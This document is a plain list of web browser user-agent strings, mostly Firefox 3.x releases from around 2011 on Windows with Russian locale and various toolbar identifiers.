Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.7 (build 03789) Firefox/3.6.16
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.9) Gecko/20100315 MRA 5.5 (build 02842) Firefox/3.5.9 (.NET CLR 3.5.30729) sputnik 2.0.1.41 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.7 (build 03797) Firefox/3.6.16 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 Firefox/3.0.19 sputnik 2.4.0.49
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 sputnik 2.3.0.101
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 sputnik 2.4.0.54
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 AskTbSPC2/3.11.3.15590 Firefox/3.6.16
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.18) Gecko/20110319 MRA 5.7 (build 03796) Firefox/3.5.18 sputnik 2.4.0.54
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 (CEB53480-3F8F-934C-1048-9CCECF6F0A52) Firefox/3.6.16 ( .NET CLR 3.5.30729) sputnik 2.3.0.74
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.7 (build 03791) Firefox/3.6.16 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.7 (build 03797) Firefox/3.6.16 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.18) Gecko/20110319 MRA 5.6 (build 03403) AskTbFF-DL/3.8.0.12304 Firefox/3.5.18 sputnik 2.3.0.88
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.16) Gecko/20110319 AskTbFF/3.11.3.15590 Firefox/3.6.16
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.7 (build 03797) Firefox/3.6.16 sputnik 2.4.0.54
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03797) Firefox/3.6.13
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.7 (build 03797) Firefox/3.6.16 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.7 (build 03796) Firefox/3.6.16
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 sputnik 2.4.0.54
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.6 (build 03278) Firefox/3.6.16
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.16) Gecko/20110323 Ubuntu/9.10 (karmic) Firefox/3.6.16
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9) Gecko/2008052906 MRA 5.5 (build 02842) Firefox/3.0 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.7 (build 03773) Firefox/3.6.16
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.7 (build 03797) Firefox/3.6.16
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 (8C1C4AE8-F517-2B33-C2E1-562332FA568C) Firefox/3.6.16 ( .NET CLR 3.5.30729) sputnik 2.3.0.74
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1) Gecko/20090624 Firefox/3.5 sputnik 2.3.0.101
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 AskTbPTV2/3.11.3.15590 Firefox/3.6.16 sputnik 2.4.0.46
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 sputnik 2.3.0.101
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 sputnik 2.4.0.49
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.7 (build 03790) Firefox/3.6.16
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.16) Gecko/20110319 AskTbPTV2/3.11.3.15590 Firefox/3.6.16
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.16) Gecko/20110319 SUSE/3.6.16-3.1 Firefox/3.6.16
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.16) Gecko/20101130 Firefox/3.5.16 sputnik 2.4.0.54
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 sputnik 2.4.0.40
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.7 (build 03658) Firefox/3.6.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 Firefox/3.0.19 GTB7.1 sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 AskTbPTV2/3.11.3.15590 Firefox/3.6.16 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.16) Gecko/20110319 AskTbFF/3.11.3.15590 Firefox/3.6.16 sputnik 2.4.0.54
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17 (.NET CLR 3.5.30729) sputnik 2.3.0.101
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.16) Gecko/20110322 Fedora/3.6.16-1.fc13 Firefox/3.6.16
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03797) Firefox/3.6.13 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.19) Gecko/20110420 MRA 5.6 (build 03403) Firefox/3.5.19 sputnik 2.1.0.18
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.17) Gecko/20110422 Ubuntu/10.04 (lucid) Firefox/3.6.17
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.18) Gecko/20110319 Firefox/3.5.18 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.17) Gecko/20110420 MRA 5.7 (build 03796) Firefox/3.6.17 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.19) Gecko/20110420 MRA 5.7 (build 03796) Firefox/3.5.19 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17 ( .NET CLR 3.5.30729) sputnik 2.4.0.54
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.17) Gecko/20110420 MRA 5.7 (build 03789) AskTbPTV/3.9.1.14019 Firefox/3.6.17 sputnik 2.4.0.60
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.19) Gecko/20110420 Firefox/3.5.19 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.17) Gecko/20110420 AskTbFF/3.9.1.14019 Firefox/3.6.17
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17 sputnik 2.4.0.54
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.7 (build 03797) Firefox/3.6.8 sputnik 2.4.0.60
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.17) Gecko/20110420 MRA 5.7 (build 03649) Firefox/3.6.17 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 GTB5 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.17) Gecko/20110420 AskTbSPC2/3.11.3.15590 Firefox/3.6.17
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17 sputnik unknown
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; ru; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.17) Gecko/20110420 MRA 5.7 (build 03790) Firefox/3.6.17 ( .NET CLR 3.5.30729) sputnik 2.3.1.118
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 sputnik 2.3.0.102
Mozilla/5.0 (Windows NT 5.1; WOW64; rv:2.0) Gecko/20100101 Firefox/4.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17 ( .NET CLR 3.5.30729) sputnik 2.4.0.60
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.0.6) Gecko/2009011913 MRA 5.7 (build 03797) Firefox/3.0.6 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 AskTbPTV2/3.11.3.15590 Firefox/3.6.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.17) Gecko/20110420 MRA 5.7 (build 03789) Firefox/3.6.17
Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.17) Gecko/20110420 MRA 5.6 (build 03278) AskTbNRO/3.11.3.15590 Firefox/3.6.17 (.NET CLR 3.5.30729) sputnik 2.3.0.96 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.17) Gecko/20110420 MRA 5.7 (build 03797) Firefox/3.6.17 sputnik 2.4.0.54
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17 sputnik 2.4.0.61
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.5 (build 02842) AskTbMOV/3.9.1.14019 Firefox/3.6.3 ( .NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17 sputnik 2.4.0.56
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.6 (build 03278) Firefox/3.5.5 (.NET CLR 3.5.30729) sputnik 2.2.0.34
Mozilla/5.0 (X11; FreeBSD amd64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17 sputnik 2.3.0.94
Mozilla/5.0 (Windows NT 5.2; WOW64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.17) Gecko/20110420 MRA 5.5 (build 02842) Firefox/3.6.17 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.19) Gecko/20110420 MRA 5.7 (build 03796) Firefox/3.5.19
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.17) Gecko/20110420 MRA 5.5 (build 02842) Firefox/3.6.17
Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 ( .NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.17) Gecko/20110420 MRA 5.7 (build 03797) Firefox/3.6.17 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.17) Gecko/20110420 MRA 5.7 (build 03789) Firefox/3.6.17 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6 sputnik 2.4.0.60
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17 ( .NET CLR 3.5.30729) sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17 sputnik 2.4.0.48
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.17) Gecko/20110428 Fedora/3.6.17-1.fc14 AlexaToolbar/alxf-2.11 Firefox/3.6.17
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.19) Gecko/20110420 MRA 5.7 (build 03797) Firefox/3.5.19
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2b5) Gecko/20091204 MRA 5.6 (build 03402) Firefox/3.6b5
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.17) Gecko/20110420 MRA 5.7 (build 03790) Firefox/3.6.17 (.NET CLR 3.5.30729) sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) sputnik 2.4.0.49
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17 sputnik 2.4.0.54
Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 WebMoney Advisor MRA 5.7 (build 03797);
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.7 (build 03797) Firefox/3.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.19) Gecko/20110707 Firefox/3.6.19
Mozilla/5.0 (Windows NT 6.0; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 MRA 5.7 (build 03757) Firefox/3.6.10 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1) Gecko/20090624 Firefox/3.5 sputnik 2.5.0.91
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.18) Gecko/20110614 MRA 5.5 (build 02842) Firefox/3.6.18
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18 sputnik 2.5.0.90
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.18) Gecko/20110614 MRA 5.7 (build 03796) Firefox/3.6.18 (.NET CLR 3.5.30729) sputnik 2.4.0.54
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0a1) Gecko/20110729 Firefox/8.0a1 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18 sputnik 2.5.0.142
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18 sputnik 2.2.0.35
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.20) Gecko/20110803 MRA 5.6 (build 03278) Firefox/3.6.20 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.20) Gecko/20110803 MRA 5.6 (build 03278) Firefox/3.6.20
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.20) Gecko/20110803 Firefox/3.6.20 sputnik 2.4.0.60
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.2.20) Gecko/20110803 Firefox/3.6.20
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.2) Gecko/20090729 AskTbFXTV5/3.12.2.16749 Firefox/3.5.2
Mozilla/5.0 (Windows NT 5.1; rv:2.0.1) Gecko/20110504 Firefox/4.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.5.0.90
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.5 (build 02780) Firefox/3.6.16 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.20) Gecko/20110803 MRA 5.7 (build 03790) Firefox/3.6.20 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.5 (build 02842) Firefox/3.6 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.7 (build 03773) Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.21) Gecko/20110830 Firefox/3.6.21 ( .NET CLR 3.5.30729) sputnik 2.5.0.90
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.20) Gecko/20110803 Firefox/3.6.20 sputnik 2.5.0.142
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.21) Gecko/20110830 Firefox/3.6.21 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.20) Gecko/20110803 MRA 5.7 (build 03773) Firefox/3.6.20
Mozilla/5.0 (Windows NT 6.0; rv:6.0.1) Gecko/20100101 Firefox/6.0.1
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.21) Gecko/20110830 MRA 5.7 (build 03797) Firefox/3.6.21 sputnik 2.5.0.142
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.22) Gecko/20110902 MRA 5.7 (build 03757) Firefox/3.6.22 ( .NET CLR 3.5.30729) sputnik 2.3.0.96
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.20) Gecko/20110831 Fedora/3.6.20-1.fc14 Firefox/3.6.20
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.18) Gecko/20110614 MRA 5.6 (build 03270) Firefox/3.6.18 sputnik 2.3.0.96 WebMoney Advisor
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; ru; rv:1.9.2.20) Gecko/20110803 Firefox/3.6.20
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 Firefox/3.0.19 sputnik 2.5.0.90
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.18) Gecko/20110614 MRA 5.7 (build 03797) Firefox/3.6.18 ( .NET CLR 3.5.30729)
Mozilla/5.0 (X11; U; Linux i686 (x86_64); ru; rv:1.9.2.7) Gecko/20100713 Firefox/3.6.7
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 sputnik 2.4.0.60
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6 sputnik 2.4.0.60
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.7 (build 03686) Firefox/3.6.16 sputnik 2.3.0.86
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.22) Gecko/20110902 MRA 5.7 (build 03790) Firefox/3.6.22 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 sputnik 2.4.0.49
Mozilla/5.0 (X11; Linux i686; rv:6.0.1) Gecko/20100101 Firefox/6.0.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:6.0.2) Gecko/20100101 Firefox/6.0.2
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.20) Gecko/20110803 Firefox/3.6.20 sputnik 2.4.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.17) Gecko/20110420 MRA 5.7 (build 03797) Firefox/3.6.17 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.22) Gecko/20110902 Firefox/3.6.22 sputnik 2.5.0.90
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.22) Gecko/20110902 Firefox/3.6.22 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.7 (build 03686) AskTbNRO/3.12.2.16749 Firefox/3.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.22) Gecko/20110902 Firefox/3.6.22 ( .NET CLR 3.5.30729) sputnik 2.5.0.90
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.22) Gecko/20110902 Firefox/3.6.22 sputnik 2.5.0.142
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.22) Gecko/20110902 MRA 5.7 (build 03797) Firefox/3.6.22
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.22) Gecko/20110902 Firefox/3.6.22 ( .NET CLR 3.5.30729)
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.18) Gecko/20110628 Ubuntu/10.04 (lucid) Firefox/3.6.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.22) Gecko/20110902 MRA 5.5 (build 02849) Firefox/3.6.22 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.2) Gecko/20090729 MRA 5.7 (build 03797) AskTbPTV/3.12.2.16749 Firefox/3.5.2 (.NET CLR 3.5.30729) sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.22) Gecko/20110902 Firefox/3.6.22 sputnik 2.5.0.142
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.22) Gecko/20110902 Firefox/3.6.22
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.22) Gecko/20110902 MRA 5.7 (build 03796) Firefox/3.6.22 sputnik 2.4.0.60
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.22) Gecko/20110902 MRA 5.7 (build 03796) Firefox/3.6.22 sputnik 2.5.0.142
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.22) Gecko/20110902 MRA 5.7 (build 03796) Firefox/3.6.22 (.NET CLR 3.5.30729) sputnik 2.4.0.54
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.22) Gecko/20110902 Firefox/3.6.22 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.13) Gecko/2009073022 MRA 5.5 (build 02842) Firefox/3.0.13 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.2) Gecko/20090729 MRA 5.5 (build 02842) Firefox/3.5.2 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.2) Gecko/20090729 MRA 5.4 (build 02652) Firefox/3.5.2
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows NT 5.2; rv:6.0.2) Gecko/20100101 Firefox/6.0.2
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.14) Gecko/2009082707 Firefox/3.0.14 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.13) Gecko/2009073022 MRA 5.4 (build 02645) Firefox/3.0.13
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 sputnik 2.5.0.90
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23 sputnik 2.5.0.142
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.23) Gecko/20110920 MRA 5.7 (build 03797) Firefox/3.6.23
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.23) Gecko/20110920 MRA 5.7 (build 03686) AskTbFF/3.13.1.18107 Firefox/3.6.23 RubarToolbar2714 RubarToolbar sputnik 2.5.0.150
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.0.04506.30)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23 ( .NET CLR 3.5.30729; .NET4.0E) sputnik 2.5.0.142
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.16) Gecko/20110319 MRA 5.7 (build 03797) Firefox/3.6.16 sputnik 2.5.0.90
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23 sputnik 2.5.0.148
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.22) Gecko/20110902 MRA 5.7 (build 03797) Firefox/3.6.22 sputnik 2.5.0.142
Mozilla/5.0 (Windows NT 6.1; rv:9.0a2) Gecko/20111004 Firefox/9.0a2
